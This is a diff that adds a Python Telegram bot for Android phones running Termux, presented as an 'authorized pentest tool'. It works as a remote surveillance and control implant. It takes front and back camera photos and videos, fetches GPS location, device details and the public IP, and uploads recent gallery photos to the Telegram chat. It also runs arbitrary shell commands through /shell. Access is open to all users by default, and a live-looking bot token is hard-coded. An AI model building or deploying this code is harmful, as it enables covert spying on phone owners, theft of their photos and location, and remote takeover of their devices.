@@ -1,0 +1,403 @@
+#!/usr/bin/env python3
+"""
+Telegram Camera Bot - Authorized Security Testing Only
+Target: Android device with Termux + Termux:API
+"""
+
+import os
+import sys
+import subprocess
+import time
+import logging
+import json
+from datetime import datetime
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
+
+# ====== CONFIGURATION ======
+TOKEN = "8680222304:AAFQ0rrc13qUG4c6ZOSLNWsIPyn4jq9C2A0"  # Your token
+AUTHORIZED_USERNAMES = []  # Optional: ["your_username", "other_user"] ya empty chhodein
+# ===========================
+
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
+)
+logger = logging.getLogger(__name__)
+
+PHOTO_DIR = os.path.expanduser("~/CameraBotCaptures/")
+os.makedirs(PHOTO_DIR, exist_ok=True)
+
+def is_authorized(update: Update) -> bool:
+    """Check if user is authorized"""
+    if not AUTHORIZED_USERNAMES:
+        return True  # All users allowed
+    username = update.effective_user.username
+    return username in AUTHORIZED_USERNAMES
+
+# ==================== COMMANDS ====================
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_authorized(update):
+        await update.message.reply_text("⛔ Unauthorized. This bot is for authorized testing only.")
+        return
+    
+    keyboard = [
+        [InlineKeyboardButton("📸 Front Camera", callback_data="photo_front"),
+         InlineKeyboardButton("📸 Back Camera", callback_data="photo_back")],
+        [InlineKeyboardButton("🎥 Video (5s)", callback_data="video_5"),
+         InlineKeyboardButton("🎥 Video (10s)", callback_data="video_10")],
+        [InlineKeyboardButton("🔦 Flash On", callback_data="flash_on"),
+         InlineKeyboardButton("🔦 Flash Off", callback_data="flash_off")],
+        [InlineKeyboardButton("📍 Location", callback_data="location"),
+         InlineKeyboardButton("📱 Device Info", callback_data="info")],
+        [InlineKeyboardButton("📁 Gallery", callback_data="gallery")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await update.message.reply_text(
+        "🤖 *Camera Bot Active*\n\n"
+        "Authorized penetration testing tool for Android camera assessment.\n"
+        "Commands: /photo_front /photo_back /video /flash /location /info /gallery /shell\n\n"
+        "*Buttons se bhi control kar sakte hain:*",
+        reply_markup=reply_markup,
+        parse_mode="Markdown"
+    )
+
+# --- Camera ---
+
+async def photo_front(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_authorized(update):
+        return
+    msg = await _reply(update, "📸 *Front camera capturing...*")
+    
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    filename = os.path.join(PHOTO_DIR, f"front_{timestamp}.jpg")
+    
+    try:
+        subprocess.run(["termux-camera-photo", "-c", "1", filename], timeout=15, check=True)
+        if os.path.exists(filename) and os.path.getsize(filename) > 1000:
+            with open(filename, "rb") as f:
+                await msg.delete()
+                await update.effective_chat.send_photo(
+                    f, caption=f"📸 *Front Camera* | `{timestamp}`"
+                )
+        else:
+            await _edit(update, msg, "❌ Photo empty. Check Termux camera permission.")
+    except FileNotFoundError:
+        await _edit(update, msg, "❌ `termux-camera-photo` not found. Install: `pkg install termux-api`")
+    except subprocess.TimeoutExpired:
+        await _edit(update, msg, "⏱️ Camera timeout")
+    except Exception as e:
+        await _edit(update, msg, f"❌ Error: `{str(e)[:100]}`")
+
+async def photo_back(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_authorized(update):
+        return
+    msg = await _reply(update, "📸 *Back camera capturing...*")
+    
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    filename = os.path.join(PHOTO_DIR, f"back_{timestamp}.jpg")
+    
+    try:
+        subprocess.run(["termux-camera-photo", "-c", "0", filename], timeout=15, check=True)
+        if os.path.exists(filename) and os.path.getsize(filename) > 1000:
+            with open(filename, "rb") as f:
+                await msg.delete()
+                await update.effective_chat.send_photo(
+                    f, caption=f"📸 *Back Camera* | `{timestamp}`"
+                )
+        else:
+            await _edit(update, msg, "❌ Photo empty. Check Termux camera permission.")
+    except FileNotFoundError:
+        await _edit(update, msg, "❌ `termux-camera-photo` not found. Install: `pkg install termux-api`")
+    except subprocess.TimeoutExpired:
+        await _edit(update, msg, "⏱️ Camera timeout")
+    except Exception as e:
+        await _edit(update, msg, f"❌ Error: `{str(e)[:100]}`")
+
+async def video_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_authorized(update):
+        return
+    
+    duration = 5
+    if context.args and context.args[0].isdigit():
+        duration = min(int(context.args[0]), 30)
+    
+    msg = await _reply(update, f"🎥 *Recording {duration}s video...*")
+    
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    filename = os.path.join(PHOTO_DIR, f"video_{timestamp}.mp4")
+    
+    try:
+        subprocess.run(
+            ["termux-camera-record", "-c", "0", "-d", str(duration), filename],
+            timeout=duration + 15, check=True
+        )
+        if os.path.exists(filename) and os.path.getsize(filename) > 5000:
+            with open(filename, "rb") as f:
+                await msg.delete()
+                await update.effective_chat.send_video(
+                    f, caption=f"🎥 *Video* | `{timestamp}` | `{duration}s`",
+                    supports_streaming=True
+                )
+        else:
+            await _edit(update, msg, "❌ Video recording failed or empty.")
+    except Exception as e:
+        await _edit(update, msg, f"❌ Error: `{str(e)[:100]}`")
+
+# --- Flashlight ---
+
+async def flash_on(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_authorized(update):
+        return
+    try:
+        subprocess.run(["termux-torch", "on"], timeout=5)
+        await _reply(update, "🔦 *Flashlight: ON*")
+    except Exception as e:
+        await _reply(update, f"❌ Error: `{str(e)[:100]}`")
+
+async def flash_off(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_authorized(update):
+        return
+    try:
+        subprocess.run(["termux-torch", "off"], timeout=5)
+        await _reply(update, "🔦 *Flashlight: OFF*")
+    except Exception as e:
+        await _reply(update, f"❌ Error: `{str(e)[:100]}`")
+
+# --- Location ---
+
+async def location_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_authorized(update):
+        return
+    msg = await _reply(update, "📍 *Fetching GPS location...*")
+    try:
+        result = subprocess.run(["termux-location"], capture_output=True, text=True, timeout=15)
+        data = json.loads(result.stdout)
+        lat = data.get("latitude", "N/A")
+        lon = data.get("longitude", "N/A")
+        acc = data.get("accuracy", "N/A")
+        
+        await msg.delete()
+        # Send location pin
+        await update.effective_chat.send_location(
+            latitude=lat, longitude=lon
+        )
+        await update.effective_chat.send_message(
+            f"📍 *Location*\nLat: `{lat}`\nLon: `{lon}`\nAccuracy: `{acc}m`"
+        )
+    except Exception as e:
+        await _edit(update, msg, f"❌ GPS Error: `{str(e)[:100]}`")
+
+# --- Device Info ---
+
+async def info_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_authorized(update):
+        return
+    
+    lines = ["📱 *Device Information*\n"]
+    props = {
+        "Brand": "ro.product.brand",
+        "Model": "ro.product.model",
+        "Android": "ro.build.version.release",
+        "SDK": "ro.build.version.sdk",
+        "Manufacturer": "ro.product.manufacturer",
+        "Device": "ro.product.device",
+        "Security Patch": "ro.build.version.security_patch",
+        "Fingerprint": "ro.build.fingerprint"
+    }
+    
+    for name, prop in props.items():
+        try:
+            val = subprocess.run(["getprop", prop], capture_output=True, text=True).stdout.strip()
+            if val:
+                lines.append(f"• *{name}:* `{val}`")
+        except:
+            pass
+    
+    # Battery
+    try:
+        batt = subprocess.run(["termux-battery-status"], capture_output=True, text=True, timeout=5)
+        batt_data = json.loads(batt.stdout)
+        lines.append(f"• *Battery:* `{batt_data.get('percentage','?')}%` ({batt_data.get('status','?')})")
+    except:
+        pass
+    
+    # Network
+    try:
+        ip = subprocess.run(["curl", "-s", "--max-time", "5", "ifconfig.me"],
+                           capture_output=True, text=True).stdout.strip()
+        if ip:
+            lines.append(f"• *Public IP:* `{ip}`")
+    except:
+        pass
+    
+    await _reply(update, "\n".join(lines))
+
+# --- Gallery ---
+
+async def gallery_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_authorized(update):
+        return
+    
+    gallery_paths = [
+        "/sdcard/DCIM/Camera/",
+        "/storage/emulated/0/DCIM/Camera/",
+        os.path.expanduser("~/storage/dcim/Camera/")
+    ]
+    
+    target_path = None
+    for p in gallery_paths:
+        if os.path.exists(p):
+            target_path = p
+            break
+    
+    if not target_path:
+        # Try to symlink storage first
+        subprocess.run(["termux-setup-storage"], timeout=10)
+        time.sleep(2)
+        for p in gallery_paths:
+            if os.path.exists(p):
+                target_path = p
+                break
+    
+    if not target_path:
+        await _reply(update, "❌ Gallery path not accessible. Run `termux-setup-storage` first.")
+        return
+    
+    try:
+        files = sorted(
+            [f for f in os.listdir(target_path) if f.lower().endswith(('.jpg', '.jpeg', '.png'))],
+            key=lambda f: os.path.getmtime(os.path.join(target_path, f)),
+            reverse=True
+        )[:5]
+        
+        if not files:
+            await _reply(update, "📁 *Gallery:* No photos found.")
+            return
+        
+        msg = f"📁 *Gallery - Last {len(files)} Photos*\n\n"
+        for i, f in enumerate(files, 1):
+            fp = os.path.join(target_path, f)
+            size = os.path.getsize(fp) // 1024
+            mt = datetime.fromtimestamp(os.path.getmtime(fp)).strftime("%d-%m-%Y %H:%M")
+            msg += f"`{i}.` {f}\n   📏 `{size}KB` | 🕐 `{mt}`\n\n"
+        
+        await _reply(update, msg)
+        
+        # Send latest photo
+        latest = os.path.join(target_path, files[0])
+        with open(latest, "rb") as f:
+            await update.effective_chat.send_photo(f, caption=f"📷 Latest: {files[0]}")
+    except Exception as e:
+        await _reply(update, f"❌ Gallery Error: `{str(e)[:100]}`")
+
+# --- Shell ---
+
+async def shell_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_authorized(update):
+        return
+    if not context.args:
+        await _reply(update, "Usage: `/shell <command>`\nExample: `/shell ls -la`")
+        return
+    
+    cmd = " ".join(context.args)
+    msg = await _reply(update, f"⚡ `{cmd}`")
+    
+    try:
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
+        output = result.stdout[:3500] or "(no output)"
+        stderr = result.stderr[:500]
+        
+        text = f"**$ {cmd}**\n```\n{output}\n```"
+        if stderr:
+            text += f"\n**stderr:**\n```\n{stderr}\n```"
+        
+        await msg.edit_text(text, parse_mode="Markdown")
+    except subprocess.TimeoutExpired:
+        await _edit(update, msg, "⏱️ Command timed out (30s)")
+    except Exception as e:
+        await _edit(update, msg, f"❌ Error: `{str(e)[:100]}`")
+
+# --- Callback Handler for Buttons ---
+
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    
+    data = query.data
+    
+    if data == "photo_front":
+        await photo_front(update, context)
+    elif data == "photo_back":
+        await photo_back(update, context)
+    elif data == "video_5":
+        context.args = ["5"]
+        await video_cmd(update, context)
+    elif data == "video_10":
+        context.args = ["10"]
+        await video_cmd(update, context)
+    elif data == "flash_on":
+        await flash_on(update, context)
+    elif data == "flash_off":
+        await flash_off(update, context)
+    elif data == "location":
+        await location_cmd(update, context)
+    elif data == "info":
+        await info_cmd(update, context)
+    elif data == "gallery":
+        await gallery_cmd(update, context)
+
+# --- Unknown Command ---
+
+async def unknown(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if is_authorized(update):
+        await _reply(update, "❓ Unknown. Type `/start` for menu.")
+
+# ==================== UTILITY ====================
+
+async def _reply(update, text):
+    """Reply with markdown"""
+    if update.callback_query:
+        await update.callback_query.message.reply_text(text, parse_mode="Markdown")
+    else:
+        return await update.message.reply_text(text, parse_mode="Markdown")
+
+async def _edit(update, msg, text):
+    """Edit message"""
+    try:
+        await msg.edit_text(text, parse_mode="Markdown")
+    except:
+        await msg.edit_text(text)
+
+# ==================== MAIN ====================
+
+def main():
+    app = Application.builder().token(TOKEN).build()
+    
+    # Commands
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("help", start))
+    app.add_handler(CommandHandler("photo_front", photo_front))
+    app.add_handler(CommandHandler("photo_back", photo_back))
+    app.add_handler(CommandHandler("video", video_cmd))
+    app.add_handler(CommandHandler("flash_on", flash_on))
+    app.add_handler(CommandHandler("flash_off", flash_off))
+    app.add_handler(CommandHandler("location", location_cmd))
+    app.add_handler(CommandHandler("info", info_cmd))
+    app.add_handler(CommandHandler("gallery", gallery_cmd))
+    app.add_handler(CommandHandler("shell", shell_cmd))
+    
+    # Buttons
+    app.add_handler(CallbackQueryHandler(button_handler))
+    
+    # Unknown
+    app.add_handler(CommandHandler("unknown", unknown))
+    
+    logger.info("🚀 Camera Bot Started - Authorized Pentest Tool")
+    print("✅ Bot chal raha hai! Telegram mein @ apna bot khol ke /start karein.")
+    app.run_polling()
+
+if __name__ == "__main__":
+    main()
